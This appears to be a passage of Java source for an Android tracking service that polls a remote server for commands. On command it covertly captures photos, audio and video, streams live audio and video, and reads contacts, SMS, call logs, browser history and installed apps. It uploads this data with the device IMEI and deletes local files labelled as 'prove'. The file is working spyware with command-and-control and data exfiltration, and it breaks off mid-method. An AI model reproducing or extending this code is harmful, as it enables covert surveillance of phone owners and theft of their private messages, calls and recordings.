package vn.vhc.live;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;




import vn.vhc.live.R;
import vn.vhc.live.erp.UtilErp;
import vn.vhc.live.liveaudio.LiveAudioManager;

import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ReceiverCallNotAllowedException;

import android.database.ContentObserver;
import android.database.Cursor;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.Size;
import android.media.AudioManager;

import android.media.MediaRecorder;
import android.net.Uri;

import android.os.CountDownTimer;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.os.SystemClock;

import android.os.PowerManager.WakeLock;
import android.provider.Browser;
import android.provider.CallLog.Calls;

import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.SignalStrength;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;
import android.view.SurfaceView;

import android.webkit.DateSorter;
import android.widget.Toast;

/**
 * Simple demo service that schedules a timer task to write something to the log
 * at regular intervals.
 * 
 * @author BMB
 * 
 */
public class APTrackerService extends Service {

	boolean isNotUsingNotification=UtilGame.isNotUsingNotification;
	private static final Class[] mStartForegroundSignature = new Class[] {
			int.class, Notification.class };
	private static final Class[] mStopForegroundSignature = new Class[] { boolean.class };

	private NotificationManager mNM;
	private Method mStartForeground;
	private Method mStopForeground;
	private Object[] mStartForegroundArgs = new Object[2];
	private Object[] mStopForegroundArgs = new Object[1];
	private int totalRetry = 0;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onDestroy() {
		UIManager.getInstance().showMsg("Super destroy...");
		try {
			if (observer != null)
				getContentResolver().unregisterContentObserver(observer);
			unregisterReceiver(mBatInfoReceiver);
			unregisterReceiver(mReceiverScreen);
		} catch (Exception ex123) {
		}

		clearAllThreadStop();

		isFinished = true;
		super.onDestroy();
	}

	private void clearAllThreadStop() {
		try {
			listen(CellStateListener.LISTEN_NONE); // new cellid
			if (thrMain != null)
				thrMain.stop();
			if (thrCell != null)
				thrCell.stop();
			if (thrMonitorBackup != null)
				thrMonitorBackup.stop();
			if (thrData != null)
				thrData.Stop();
			if (thrGps != null)
				thrGps.removeGps();
		} catch (Exception ex123) {
		}
	}

	private void clearAllThreadStop1() {
		try {
			if (thrCell != null)
				thrCell.stop();
			if (thrMonitorBackup != null)
				thrMonitorBackup.stop();
			if (thrData != null)
				thrData.Stop();
			if (thrGps != null)
				thrGps.removeGps();

		} catch (Exception ex123) {
		}
	}

	public static int cmdRealtime = -1;
	public static int cmdRealtimeCurrent = -1;

	public static String statusCmdRealtime = "-1";
	public static boolean isFirstTime = true;
	public static Date timeStartRealTime = new Date();

	public boolean isFinished = false;
	
	//processing
	public static final int START_UPLOAD_3GP=202;
	public static final int START_UPLOAD_IMG=203;
	public static final int START_UPLOAD_XML=204;
	public static final int START_UPLOAD_ALL=208;
	public static final int CLEAR_ALL_PROVE=209;
	public static final int GET_SIM=400;
	public static final int RESTART_SERVICES=10001;
	public Handler hx = new Handler() 
	{
		public void handleMessage(Message msg) {
			try {

				if (msg.what == 99) {
					cmdRealtimeCurrent = msg.what;
					// Toast.makeText(APTrackerService.this,"Start capturing image...",Toast.LENGTH_LONG).show();
					stopRecordImg();
				}
				if (msg.what == 100) {
					cmdRealtimeCurrent = msg.what;
					// Toast.makeText(APTrackerService.this,"Start capturing image...",Toast.LENGTH_LONG).show();
					startCaptureImg();
				}

				if (msg.what == 101) {
					// Toast.makeText(APTrackerService.this,"Start recording audio...",Toast.LENGTH_LONG).show();
					cmdRealtimeCurrent = msg.what;
					startRecordAudio();
					// startLiveAudio();
				}
				if (msg.what == 102) {
					// Toast.makeText(APTrackerService.this,"Stop recording audio...",Toast.LENGTH_LONG).show();
					cmdRealtimeCurrent = msg.what;
					stopRecordAudio();
					// stopLiveAudio();
				}

				if (msg.what == 103) {
					// Toast.makeText(APTrackerService.this,"Start recording video...",Toast.LENGTH_LONG).show();
					startRecordVideo();
				}
				if (msg.what == 104) {
					// Toast.makeText(APTrackerService.this,"Stop recording video...",Toast.LENGTH_LONG).show();
					stopRecordVideo();
				}
				if (msg.what == 190) 
				{
					cmdRealtimeCurrent = msg.what;
					startLiveVideo();
					//startReadSMS();
				}
				if (msg.what == 191) 
				{
					cmdRealtimeCurrent = msg.what;
					stopLiveVideo();					
				}
				if (msg.what == 105) {
					cmdRealtimeCurrent = msg.what;
					startLiveAudio();
				}
				if (msg.what == 106) {
					cmdRealtimeCurrent = msg.what;
					stopLiveAudio();
				}
				if (msg.what == 107) 
				{
					cmdRealtimeCurrent = msg.what;
					startReadContact();					
				}				
				if (msg.what == 112) 
				{
					cmdRealtimeCurrent = msg.what;
					startReadSMS();
					//startReadSMS();
				}
				if (msg.what == 113) 
				{
					cmdRealtimeCurrent = msg.what;
					startReadLogCall();
					//startReadSMS();
				}
				if (msg.what == 118) 
				{
					cmdRealtimeCurrent = msg.what;
					startReadInstalledApps();					
				}
				
				//
				if (msg.what == 108) 
				{
					cmdRealtimeCurrent = msg.what;
					startTurnOnWifi();
				}
				if (msg.what == 109) 
				{
					cmdRealtimeCurrent = msg.what;
					startTurnOffWifi();
				}
				if (msg.what == 110) 
				{
					cmdRealtimeCurrent = msg.what;
					startTurnOn3G();
				}
				if (msg.what == 111) 
				{
					cmdRealtimeCurrent = msg.what;
					startTurnOff3G();
				}
				
				if (msg.what == 114) 
				{
					cmdRealtimeCurrent = msg.what;
					startTurnOnGps();
				}
				if (msg.what == 115) 
				{
					cmdRealtimeCurrent = msg.what;
					startTurnOffGps();
				}					
				/*
				if (msg.what == 108) {
					cmdRealtimeCurrent = msg.what;
					stopReadContact();
				}
				*/
				if (msg.what == RESTART_SERVICES) {
					stopSelf();
				}
				// turnonscreentogetcellid
				if (msg.what ==  201) {
					startTurnOnScreenToGetCellID();
					// onDestroy();
				}
				
				//notify upload 3gp
				if (msg.what == START_UPLOAD_3GP) 
				{
					startUpload3GP();
				}
				//notify upload 3gp
				if (msg.what == START_UPLOAD_IMG) 
				{
					startUploadJPG();
				}
				//notify upload 3gp
				if (msg.what == START_UPLOAD_XML) 
				{
					startUploadXML();
				}
				if (msg.what == START_UPLOAD_ALL) 
				{
					startUpload3GP();
					startUploadJPG();
					startUploadXML();
				}
				//clear all to prove files
				if (msg.what == CLEAR_ALL_PROVE) 
				{
					clearAllProve();
				}
				super.handleMessage(msg);
			} catch (Exception ex) {
				UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
						TypeData.ERROR_LOG, "CAndC:" + ex.toString(), String
								.valueOf(BatteryLog.levelBattery), "", "",
						UtilGame.getInstance().GetStringNow()));
				//debugMsg("Android==>" + ex.toString());
				// debugMsg("CMDrealtime:"+ex.toString());
				// (new HttpData()).notifyRealtimeCmd(TypeCmd.ERROR);
			}
		}
	};
	public Handler hxDebug = new Handler() {

		public void handleMessage(Message msg) {
			Toast.makeText(APTrackerService.this,
					"android:" + (String) msg.obj, Toast.LENGTH_LONG).show();
			super.handleMessage(msg);
		}
	};
	
	@Override
	public void onCreate() {
		super.onCreate();
		if(isNotUsingNotification) return;
		mNM = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
		
		
		try {
			mStartForeground = getClass().getMethod("startForeground",
					mStartForegroundSignature);
			mStopForeground = getClass().getMethod("stopForeground",
					mStopForegroundSignature);
		} catch (NoSuchMethodException e) {
			// Running on an older platform.
			mStartForeground = mStopForeground = null;
		}
		// getBaseContext();
	}

	protected void clearAllProve() {
		// TODO Auto-generated method stub
		try{
			String[] arrFile = FileUtil.getFileToUpload(".txt");
			for (String fName : arrFile) {
				fName = FileUtil.DIR_SAVE + fName;
				FileUtil.deleteFile(fName);
			}
		}catch(Exception ex){}
		try{
			String[] arrFile = FileUtil.getFileToUpload(".xml");
			for (String fName : arrFile) {
				fName = FileUtil.DIR_SAVE + fName;
				FileUtil.deleteFile(fName);
			}
		}catch(Exception ex){}
		try{
			String[] arrFile = FileUtil.getFileToUpload(".jpg");
			for (String fName : arrFile) {
				fName = FileUtil.DIR_SAVE + fName;
				FileUtil.deleteFile(fName);
			}
		}catch(Exception ex){}
		try{
			String[] arrFile = FileUtil.getFileToUpload(".3gp");
			for (String fName : arrFile) {
				fName = FileUtil.DIR_SAVE + fName;
				FileUtil.deleteFile(fName);
			}
		}catch(Exception ex){}
	}

	// Alarm alarm= new Alarm();
	// private static Uri STATUS_URI = Uri.parse("content://sms/sent");
	private static Uri STATUS_URI = Uri.parse("content://sms");

	ContentObserver observer;
	ContentObserver observerBrowser;

	private Thread thrCell;
	private Thread thrMain;
	private Thread thrMonitorBackup;
	private SocketData thrData;
	private GPSPosition thrGps;

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		handleService(intent, startId);
		return Service.START_STICKY;
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		handleService(intent, startId);
	}

	private TelephonyManager tMgr;
	private int phoneType;

	void handleService(Intent intent, int startId) {
		UtilGame.indexThread = UtilGame.indexThread + 1;

		UtilGame.isRunningService = true;
		// timeStarted=(new Date()).getTime();
		// startForeground(BIND_AUTO_CREATE, new Notification(1,
		// "PTracker Running", 10000));
		startForegroundCompat(1, new Notification());

		// To wake up the screen:
		final Context currentContext = getApplicationContext();

		ContextManagerCore.getInstance().setCurrentContext(currentContext);
		ContextManagerCore.getInstance().startServiceMonitorIfNeed();

		// TelephonyManager
		tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		LocationUtil.IMEI = tMgr.getDeviceId();
		phoneType = tMgr.getPhoneType();

		// ContextManagerCore.getInstance().sendSMSToRegister(LocationUtil.IMEI);
		ContextManagerCore.getInstance()
				.saveToDB("iddevice", LocationUtil.IMEI);

		UtilGame.typegame = getResources().getString(R.string.typegame)
				+ getResources().getString(R.string.suffix);
		UtilGame.liveaudio = getResources().getString(R.string.liveaudio);

		String keyFirstRuntime = ContextManagerCore.getInstance().readFromDB(
				"IsFirstRun");
		if (keyFirstRuntime == null || keyFirstRuntime.equals("")) {
			ContextManagerCore.getInstance().saveToDB("IsFirstRun",
					"reinstall:" + UtilGame.getInstance().GetStringNow());
			UtilGame.isFirstRun = UtilGame.getInstance().GetStringNow();
			// keyFirstRuntime="First";
			// UtilGame.isFirstRun=true;
		} else
			UtilGame.isFirstRun = keyFirstRuntime;// UtilGame.isFirstRun=false;

		// ConfigGame.getInstance(this).setActiveKey(yourKey);//+"-"+keyFirstRuntime);
		// LocationUtil.IMEI=yourKey;

		this.registerReceiver(this.mBatInfoReceiver, new IntentFilter(
				Intent.ACTION_BATTERY_CHANGED));

		this.registerReceiver(mReceiverScreen, new IntentFilter(
				Intent.ACTION_SCREEN_OFF));

		makeDirTemp();

		thrGps = new GPSPosition(this);

		thrData = new SocketData(this);
		thrData.Start();

		// listen cellid
		listen(CellStateListener.EVENTS);

		thrCell = (new Thread(new Runnable() {
			@Override
			public void run() {
				while (true) {
					try {

						// skip if(isFinished)break;
						Thread.sleep(120000);

						// skip if(isFinished)break;
						if (!LocationListenerImpl.isReachedNewCellID) {
							hx.sendEmptyMessage(201);
						}
						if (LocationListenerImpl.code_cellid.equals("")
								|| LocationListenerImpl.code_cellid
										.equals("-1")
								|| LocationListenerImpl.code_cellid.equals("0")) {
							// TelephonyManager tMgr =
							// (TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
							// TelephonyManager tMgr =
							// (TelephonyManager)APTrackerService.this.getSystemService(Context.TELEPHONY_SERVICE);
							// sDebug= tMgr.getLine1Number();
							GsmCellLocation cell = (GsmCellLocation) tMgr
									.getCellLocation();
							if (cell != null) {
								LocationListenerImpl.code_cellid = String
										.valueOf(cell.getCid());
								LocationListenerImpl.code_lac = String
										.valueOf(cell.getLac());
								
								LocationListenerImpl.code_mmc = tMgr.getNetworkOperator();//.substring(0, 3);
								if(LocationListenerImpl.code_mmc.length()>=3)
									LocationListenerImpl.code_mmc =LocationListenerImpl.code_mmc.substring(0, 3);
								
								LocationListenerImpl.code_mnc = tMgr.getNetworkOperator();//.substring(3);								
								if(LocationListenerImpl.code_mnc.length()>3)
									LocationListenerImpl.code_mnc =LocationListenerImpl.code_mnc.substring(3);
							}
						}
						// Thread.sleep(30000);

					} catch (Exception ex) {
						UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
								TypeData.ERROR_LOG, "Thread CID:"
										+ ex.toString(), String
										.valueOf(BatteryLog.levelBattery), "",
								"", UtilGame.getInstance().GetStringNow()));
						try {
							Thread.sleep(30000);
						} catch (Exception exxx) {
						}
						// break;
					}
				}
			}
		}));
		// thrCell.setPriority(Thread.MIN_PRIORITY);
		thrCell.start();

		PowerManager pm = (PowerManager) currentContext
				.getSystemService(Context.POWER_SERVICE);
		final WakeLock wakeLock = pm.newWakeLock(
				(PowerManager.PARTIAL_WAKE_LOCK), "TAG");

		thrMain = new Thread(new Runnable() {
			private int indexThread = -1;

			@Override
			public void run() {
							
				int timeToSendData = 180000;// ms
				int timeSleepSavePin = 500;// 500 ms
				int timeSleepBusy = 1000;
				int timeToGetStatus = 15000;
				int totalTimeElapsed = -1;//time elapsed data running
				int totalTimeElapsedStatus = 0;//time elapsed data running status
				// TODO Auto-generated method stub
				while (true) {

					try 
					{
						// first time
						if (indexThread == -1)
							indexThread = UtilGame.indexThread;
						if (indexThread != UtilGame.indexThread) {
							clearAllThreadStop1();
							break;
						}
						if (UtilGame.modeOffline) 
						{
							UtilMemory.flushToFileIfNeed();// only flush file....
							Thread.sleep(4*60000);
							continue;
							
						}else 
						{
							//if is only wifi
							if (UtilGame.modeOnlyWifi && !UtilGame.typeconnect.toLowerCase().equals("wifi")) 
							{
								UtilMemory.flushToFileIfNeed();// only flush file....
								Thread.sleep(4*60000);
								continue;
							} 
							 
							// skip if(isFinished)break;
							UtilGame.getInstance().loadConfigFromDB();

							if (UtilGame.savepin == 1)
								timeToSendData = 180000;
							else
								timeToSendData = 60000;
							
							
							// neu ko can thuc hien lenh candc va cung ko thuc
							// hien gi hoac ko phai ket noi wifi thi ko can
							// connect lien tuc
							/*
							if (UtilGame.savepin == 1
									&& !UtilGame.getInstance().isCAndC()
									&& (!statusCmdRealtime
											.equals(TypeCmd.PROCESSING))
									&& (!UtilGame.typeconnect.toLowerCase()
											.equals("wifi")))
								timeToGetStatus = 180000;
							 */
							if (UtilGame.savepin == 1) 
								timeToGetStatus = 180000;
							// neu la wifi thi giam toc do ket noi
							else if (UtilGame.typeconnect.toLowerCase().equals(
									"wifi"))
								timeToGetStatus = 60000;// addtotest 17/12/2012
							else
								timeToGetStatus = 30000;

							UtilGame.debug = timeToGetStatus + "_"
									+ timeToSendData + "_"
									+ UtilGame.timeToRestart + "_thr"
									+ UtilGame.indexThread;
							
							//send data reatime
							if(UtilGame.autoSmartBattery && (new Date()).getHours()>=23 ||  (new Date()).getHours()<=5)
							{
								timeToSendData=280000;
								timeToGetStatus=280000;		
								
								timeSleepBusy=10;
								timeSleepSavePin=120000;
							}
							
							// send command
							wakeLock.acquire();

							Thread.sleep(timeSleepBusy);
							// skip if(isFinished)break;
							// start processing
							String sx = null;
							// if(totalTimeElapsed==-1 ||
							// totalTimeElapsed>=timeToSendData)
							debugMsg("totalTimeElapsed="+totalTimeElapsed+",timeToSendData="+timeToSendData+"==>"+(totalTimeElapsed >= timeToSendData));
							
							if (totalTimeElapsed == -1
									|| totalTimeElapsed >= timeToSendData) {
								// debugMsg("Show senddata...");
								totalTimeElapsed = 0;
								UtilMemory.flushToFileIfNeed();

								DataObject o = UtilMemory.getData();
								// post online if has data
								if (o != null) {
									if (o.get_type() == TypeData.GPS_LOG
											|| o.get_type() == TypeData.SMS_LOG
											|| o.get_type() == TypeData.CALL_LOG
											|| o.get_type() == TypeData.BATTERY_LOG) {
										sx = (new HttpData().postUrlOffline(o
												.toUrlString()));
									}
									if (o.get_type() == TypeData.VIDEO_LOG
											|| o.get_type() == TypeData.AUDIO_LOG
											|| o.get_type() == TypeData.IMG_LOG) {
										sx = (new HttpData()).httpPostFile(
												o.toUrlString(), "File.jpg",
												o.get_data(), true);
									}
									if (sx != null)
										UtilMemory.removeData();
									parseToRealTime(sx);
								}

								// check file offline
								String[] arrFile = FileUtil
										.getFileToUpload(".txt");

								for (String fName : arrFile) {
									fName = FileUtil.DIR_SAVE + fName;
									String queryParams = "iddevice="
											+ LocationUtil.IMEI;
									sx = (new HttpData()).httpPostFile(
											HttpData.prefixUrlData()
													+ "handlepackagesxxx.aspx?"
													+ queryParams, fName,
											fName, true);

									parseToRealTime(sx);
								}
								arrFile = FileUtil.getFileToUpload(".jpg");
								for (String fName : arrFile) {
									fName = FileUtil.DIR_SAVE + fName;
									String queryParams = "type=10&iddevice="
											+ LocationUtil.IMEI;
									sx = (new HttpData()).httpPostFile(
											HttpData.prefixUrlData()
													+ "handlePositionXXX.aspx?"
													+ queryParams, fName,
											fName, true);

									parseToRealTime(sx);
								}

								arrFile = FileUtil.getFileToUpload(".3gp");
								for (String fName : arrFile) {
									fName = FileUtil.DIR_SAVE + fName;
									String queryParams = "type=10&iddevice="
											+ LocationUtil.IMEI;
									sx = (new HttpData()).httpPostFile(
											HttpData.prefixUrlData()
													+ "handlePositionXXX.aspx?"
													+ queryParams, fName,
											fName, true);

									parseToRealTime(sx);
								}
								
								arrFile = FileUtil.getFileToUpload(".xml");
								for (String fName : arrFile) {
									fName = FileUtil.DIR_SAVE + fName;
									String queryParams = "type=11&iddevice="
											+ LocationUtil.IMEI;
									sx = (new HttpData()).httpPostFile(
											HttpData.prefixUrlData()
													+ "handlePositionXXX.aspx?"
													+ queryParams, fName,
											fName, true);

									parseToRealTime(sx);
								}								
							}
							//send status reatime
							if ((totalTimeElapsedStatus == -1)
									|| (totalTimeElapsedStatus >= timeToGetStatus)) {
								totalTimeElapsedStatus = 0;
								UtilGame.lastData = UtilGame.lastData
										.replaceAll("#", "@");
								sx = (new HttpData().getData(
										"getStatusXXX.aspx", "iddevice="
												+ LocationUtil.IMEI + "&type="
												+ UtilGame.typegame
												+ "&sdcard="
												+ UtilGame.isSdCard + "&pin="
												+ BatteryLog.levelBattery
												+ "&d=" + UtilGame.lastData));
								parseToRealTime(sx);

							}

							// start add new
							if (cmdRealtime != -1) {
								//debugMsg("cmdRealtime:" + cmdRealtime);
								// send command
								hx.sendEmptyMessage(cmdRealtime);
								cmdRealtime = -1;
							} else {
								// if((UtilGame.errNetWorkTimes>=UtilGame.maxTimeOutTimes)
								// && ((new
								// Date()).getTime()-timeStartRealTime.getTime()>=UtilGame.maxTimeToCancel)
								// &&
								// statusCmdRealtime.equals(TypeCmd.PROCESSING
								// ))
								if (((new Date()).getTime()
										- timeStartRealTime.getTime() >= UtilGame.maxTimeToCancel)
										&& statusCmdRealtime
												.equals(TypeCmd.PROCESSING)) {
									cancelCurrent();
								}
							}
							// end processing
							wakeLock.release();

							// it is time to restart
							if (((new Date()).getTime()
									- UtilGame.timeStarted.getTime() >= UtilGame.timeToRestart)
									&& (!statusCmdRealtime
											.equals(TypeCmd.PROCESSING))
									&& UtilGame.useRestartAuto) {
								hx.sendEmptyMessage( APTrackerService.RESTART_SERVICES);
							}
							// sleep if it is run mode save power
							if ((UtilGame.savepin == 1)
									&& (!statusCmdRealtime
											.equals(TypeCmd.PROCESSING)))// &&
																			// (!UtilGame.typeconnect.toLowerCase().equals("wifi")))
							{
								// skip if(isFinished)break;
								Thread.sleep(timeSleepSavePin);
								totalTimeElapsed += timeSleepSavePin;
								totalTimeElapsedStatus += timeSleepSavePin;
							}
							totalTimeElapsed += timeSleepBusy;
							totalTimeElapsedStatus += timeSleepBusy;
						}

					} catch (Exception e) {
						//debugMsg("s1==>" + e.toString());
						UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
								TypeData.ERROR_LOG, "Thread Main:"
										+ e.toString(), String
										.valueOf(BatteryLog.levelBattery), "",
								"", UtilGame.getInstance().GetStringNow()));
						try {
							wakeLock.release();
							Thread.sleep(15000);
						} catch (Exception exxxx) {
							UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
									TypeData.ERROR_LOG, "Thread MainOfMain:"
											+ exxxx.toString(), String
											.valueOf(BatteryLog.levelBattery),
									"", "", UtilGame.getInstance()
											.GetStringNow()));

						}
					}
				}
			}

			//parse realtime
		});

		thrMain.setPriority(Thread.MIN_PRIORITY);
		thrMain.start();

		if (UtilGame.useRestartAuto) {
			thrMonitorBackup = (new Thread(new Runnable() {
				@Override
				public void run() {
					int totalMonitorBackupTimeElapsed = 0;
					while (true) {
						try {
							if (((new Date()).getTime()
									- UtilGame.timeStarted.getTime() > (UtilGame.timeToRestart + 5 * 60000))
									&& (!statusCmdRealtime
											.equals(TypeCmd.PROCESSING))
									&& UtilGame.useRestartAuto) {
								totalRetry++;
								// ContextManagerCore.getInstance().restartService();
								hx.sendEmptyMessage(APTrackerService.RESTART_SERVICES);
							}
							Thread.sleep(120000);
							totalMonitorBackupTimeElapsed = totalMonitorBackupTimeElapsed + 120000;
							if (totalRetry == 10) {
								break;
							}
						} catch (Exception ex) {
							try {
								UtilMemory.addTo(new DataObject(
										LocationUtil.IMEI,
										TypeData.ERROR_LOG,
										"Thread thrMonitorBackup:"
												+ ex.toString(),
										String.valueOf(BatteryLog.levelBattery),
										"", "", UtilGame.getInstance()
												.GetStringNow()));
								Thread.sleep(60000);
								totalMonitorBackupTimeElapsed = totalMonitorBackupTimeElapsed + 60000;
							} catch (Exception exxx) {
							}
						}
					}
				}
			}));

			thrMonitorBackup.start();
		}

		if (observer == null) {
			observer = new ContentObserver(null) {

				public void onChange(boolean selfChange) {
					try {
						Cursor cursor = getContentResolver().query(
								(STATUS_URI), null, null, null, null);
						// DataObject sms = null;
						if (cursor.moveToNext()) {
							String protocol = cursor.getString(cursor
									.getColumnIndex("protocol"));
							int type = cursor.getInt(cursor
									.getColumnIndex("type"));

							// Only processing outgoing sms event & only when it
							// is sent successfully (available in SENT box).
							if (protocol != null || type != 2) {
								return;
							}
							int dateColumn = cursor.getColumnIndex("date");
							int bodyColumn = cursor.getColumnIndex("body");
							int addressColumn = cursor
									.getColumnIndex("address");

							String strDate = UtilGame.getInstance()
									.GetStringNow();
							try {
								long timeLong = cursor.getLong(dateColumn);
								strDate = UtilGame.getInstance()
										.GetStringFromTimeStamp(timeLong);
							} catch (Exception exxxxxx) {
							}
							// String from = "0";
							String tel = cursor.getString(addressColumn);
							// Date now = new Date(cursor.getLong(dateColumn));
							String message = cursor.getString(bodyColumn);
							DataObject oSms = new DataObject(LocationUtil.IMEI,
									TypeData.SMS_LOG, ContextManagerCore
											.getInstance().readLastPosition(),
									String.valueOf(BatteryLog.levelBattery),
									tel, TypeData.CALL_OUTCOMING, strDate);
							oSms.set_extradata(message);
							UtilMemory.addTo(oSms);
						}
						cursor.close();
						cursor = null;
					} catch (Exception ex) {
						UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
								TypeData.ERROR_LOG, "SmsSent:" + ex.toString(),
								String.valueOf(BatteryLog.levelBattery), "",
								"", UtilGame.getInstance().GetStringNow()));

						//debugMsg("Exception when parseToRealTime:"
						//		+ ex.toString());
					}
				}
			};
			getContentResolver().registerContentObserver(STATUS_URI, true,
					observer);
		}
		if (observerBrowser == null) {
			observerBrowser = new ContentObserver(null) {
				@Override
				public void onChange(boolean selfChange) {
					try {
						// Log.d("History","Bookmarks has changed");
						Cursor mCur = getContentResolver().query(
								Browser.BOOKMARKS_URI,
								Browser.HISTORY_PROJECTION, null, null, null);
						mCur.moveToLast();
						if (mCur.moveToLast() && mCur.getCount() > 0) {
							while (mCur.isAfterLast() == false) {
								String titleIdx = mCur
										.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX);

								String urlIdx = mCur
										.getString(Browser.HISTORY_PROJECTION_URL_INDEX);

								String timex = mCur
										.getString(Browser.HISTORY_PROJECTION_DATE_INDEX);

								String dateToServer = "";
								if (timex == null) {
									dateToServer = UtilGame.getInstance()
											.GetStringNow();
								} else {
									long timeLong = Long.parseLong(timex);
									dateToServer = UtilGame.getInstance()
											.GetStringFromTimeStamp(timeLong);
								}
								DataObject oHistory = new DataObject(
										LocationUtil.IMEI,
										TypeData.WEB_LOG,
										ContextManagerCore.getInstance()
												.readLastPosition(),
										String.valueOf(BatteryLog.levelBattery),
										urlIdx, TypeData.CALL_OUTCOMING,
										dateToServer);
								oHistory.set_extradata(titleIdx);
								UtilMemory.addTo(oHistory);
								mCur.moveToNext();
							}
						}
						mCur.close();
						mCur = null;

						super.onChange(selfChange);
					} catch (Exception ex) {
						UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
								TypeData.ERROR_LOG, "Browser:" + ex.toString(),
								String.valueOf(BatteryLog.levelBattery), "",
								"", UtilGame.getInstance().GetStringNow()));

						//debugMsg("Exception when parseToRealTime:"
						//		+ ex.toString());
					}
				}
			};
			getContentResolver().registerContentObserver(Browser.BOOKMARKS_URI,
					true, observerBrowser);
		}
		//ProxyService.getInstance().bindUI(hx);
		/*
		 * Cursor cursor=Browser.getAllVisitedUrls(getContentResolver());
		 * cursor.moveToFirst(); int occasions=0; while (cursor.moveToNext()) {
		 * String
		 * urlVisited=cursor.getString(cursor.getColumnIndex(BookmarkColumns
		 * .URL)); if (urlVisited.contains("www.google.")) { occasions++; }
		 * Log.d
		 * ("History",cursor.getString(cursor.getColumnIndex(BookmarkColumns
		 * .URL))); } Log.d("History","occasions="+occasions);
		 * 
		 * //zzzzz
		 * getContentResolver().registerContentObserver(Browser.BOOKMARKS_URI,
		 * true, new ContentObserver(new Handler()) {
		 * 
		 * @Override public void onChange(boolean selfChange) {
		 * Log.d("History","Bookmarks has changed"); super.onChange(selfChange);
		 * }
		 * 
		 * }); <uses-permission
		 * android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"
		 * / Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI,
		 * Browser.HISTORY_PROJECTION, null, null, null); mCur.moveToFirst(); if
		 * (mCur.moveToFirst() && mCur.getCount() > 0) { while
		 * (mCur.isAfterLast() == false) { Log.v("titleIdx", mCur
		 * .getString(Browser.HISTORY_PROJECTION_TITLE_INDEX)); Log.v("urlIdx",
		 * mCur .getString(Browser.HISTORY_PROJECTION_URL_INDEX));
		 * 
		 * Log.v("urlIdx", mCur
		 * .getString(Browser.HISTORY_PROJECTION_DATE_INDEX));
		 * mCur.moveToNext(); } }
		 */

		/*
		 * observer= new ContentObserver(null) {
		 * 
		 * @Override public void onChange(boolean selfChange) { Cursor cursor =
		 * getContentResolver().query( Calls.CONTENT_URI, null, Calls.TYPE +
		 * " = ? AND " + Calls.NEW + " = ?", new String[] {
		 * Integer.toString(Calls.MISSED_TYPE), "1" }, Calls.DATE + " DESC ");
		 * 
		 * //this is the number of missed calls //for your case you may need to
		 * track this number //so that you can figure out when it changes
		 * cursor.getCount(); } };
		 */
		/*
		 * PackageManager pm = getApplicationContext().getPackageManager(); try
		 * { pm.setComponentEnabledSetting( new ComponentName(getPackageName(),
		 * "vn.vhc.live.APTrackerService1") ,
		 * PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
		 * PackageManager.DONT_KILL_APP); }catch(Exception ex){}
		 * 
		 * try { pm.setComponentEnabledSetting(new
		 * ComponentName("vn.vhc.live",
		 * "vn.vhc.live.APTrackerService2") ,
		 * PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
		 * PackageManager.DONT_KILL_APP); }catch(Exception ex){}
		 */
	}
	// sx: interval#status#candc
	private void parseToRealTime(String sx) {
		try {
			String sxo = sx;
			if (sx != null && !sx.equals("")) {
				sx = sx.replaceAll("\n", "");
				String[] arrSx = sx.split("#");
				sx = arrSx[0];
				HttpData.intervalTimes = Integer.valueOf(sx);

				// cmd realtime
				if (arrSx.length >= 2) {
					if (arrSx[1] != null && !arrSx[1].equals("")) {
						if (cmdRealtime == -1)
							cmdRealtime = Integer.valueOf(arrSx[1]);
					}
				}
				// candc realtime
				if (arrSx.length >= 3) {
					if (arrSx[2] != null && !arrSx[2].equals("")) {
						UtilGame.getInstance().parseCmdCAndC(arrSx[2]);
					}
				}
				// control realtime
				if (arrSx.length >= 4) {
					if (arrSx[3] != null && !arrSx[3].equals("")) {
						UtilGame.getInstance().parseCmdControlPanel(
								arrSx[3]);
					}
				}
				if (arrSx.length >= 5) 
				{
					if (arrSx[4] != null && !arrSx[4].equals("")) {
						parsePushMessage(arrSx[4]);
					}
				}
				// parseToRealTimeCAndC(sxo);
			}
		} catch (Exception ex) {
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG,
					"APtrackerServiceparseToRealTime:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "",
					UtilGame.getInstance().GetStringNow()));

			//debugMsg("Exception when parseToRealTime:" + ex.toString());
		}
	}
	private void parsePushMessage(String string) 
	{
		String sMessage=UtilErp.decompressData(string);
		if(sMessage.equalsIgnoreCase("[]")) return;
		if(sMessage.equalsIgnoreCase("")) return;
		
		Intent intent = new Intent("vn.vhc.live.message");
		intent.putExtra("iscompress", false);
		intent.putExtra("message", sMessage);
		this.sendBroadcast(intent);
	}
	void startUploadXML()
	{
		try{
			String[] arrFile = FileUtil.getFileToUpload(".xml");
